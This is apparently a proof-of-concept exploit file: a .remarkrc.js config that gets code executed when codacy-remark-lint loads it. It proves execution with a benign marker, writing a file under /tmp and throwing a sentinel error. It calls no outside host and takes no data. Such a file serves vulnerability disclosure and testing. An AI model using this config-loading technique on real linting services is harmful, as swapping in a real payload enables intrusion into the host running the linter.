// PoC payload — benign marker only. RCE via codacy-remark-lint: unified-engine
// discovers .remarkrc.js under cwd=/src and loads it via loadFromAbsolutePath -> await import(fileUrl).
// We prove code execution by throwing a sentinel built from runtime values.
var fs = require("fs");
var marker = "/tmp/codacy-remark-rce-confirmed.txt";
var body = "RCE confirmed via .remarkrc.js import. cwd=" + __dirname + " marker=" + marker + "\n";
try { fs.writeFileSync(marker, body); } catch (e) {}
throw new Error("CODEX_RCE_REMARK_PROOF_" + __dirname + "_marker_written_" + marker);
module.exports = { plugins: [], settings: {} };
